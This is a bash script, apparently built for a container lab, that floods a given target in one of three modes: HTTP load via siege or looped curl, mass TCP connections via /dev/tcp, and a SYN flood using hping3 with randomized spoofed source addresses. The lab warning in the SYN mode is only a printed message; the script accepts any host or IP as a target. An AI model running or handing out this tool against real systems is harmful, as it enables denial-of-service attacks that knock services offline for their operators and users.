#!/usr/bin/env bash
set -euo pipefail

usage() {
  cat <<EOF
Usage: $0 <mode> <target> [port] [concurrency] [duration]

modes:
  http    -> HTTP load (uses siege when available)
  conn    -> many TCP connections (basic socket loop)
  syn     -> SYN flood (hping3)  -- VERY AGGRESSIVE

Examples:
  $0 http http://frontend 80 50 30
  $0 conn backend 8000 200 20
  $0 syn 172.18.0.5 80
EOF
  exit 1
}

mode="${1:-}"
target="${2:-}"
port="${3:-80}"
concurrency="${4:-50}"
duration="${5:-30}"

if [ -z "$mode" ] || [ -z "$target" ]; then
  usage
fi

echo "Mode: $mode · Target: $target · Port: $port · Concurrency: $concurrency · Duration: ${duration}s"
echo "---"

case "$mode" in
  http)
    if command -v siege >/dev/null 2>&1; then
      echo "Running siege (HTTP) against $target (concurrency $concurrency, ${duration}s)"
      siege -q -c "$concurrency" -t "${duration}s" "$target"
    else
      echo "siege not available. Falling back to curl loops"
      end=$((SECONDS + duration))
      while [ $SECONDS -lt $end ]; do
        for i in $(seq 1 $concurrency); do
          curl -s "$target" >/dev/null &
        done
        wait
        sleep 0.5
      done
    fi
    ;;

  conn)
    # target may be an alias (backend) or IP/host
    targetHost=$(echo "$target" | sed -E 's|^https?://||' | sed -E 's|/.*$||')
    echo "Creating $concurrency concurrent TCP connections to $targetHost:$port for ${duration}s"
    end=$((SECONDS + duration))
    while [ $SECONDS -lt $end ]; do
      for i in $(seq 1 $concurrency); do
        (echo >/dev/tcp/$targetHost/$port) >/dev/null 2>&1 &
      done
      wait
      sleep 0.5
    done
    ;;

  syn)
    # VERY AGGRESSIVE, requires NET_RAW & NET_ADMIN cap
    echo "WARNING: SYN flood is destructive. Only run in a controlled lab environment. Press Ctrl+C to stop."
    # if target looks like a hostname, try to resolve
    host=$(echo "$target" | sed -E 's|^https?://||' | sed -E 's|/.*$||')
    echo "Running hping3 --rand-source -S -p $port --flood $host"
    hping3 --rand-source -S -p "$port" --flood "$host"
    ;;

  *)
    usage
    ;;
esac

echo "Done"
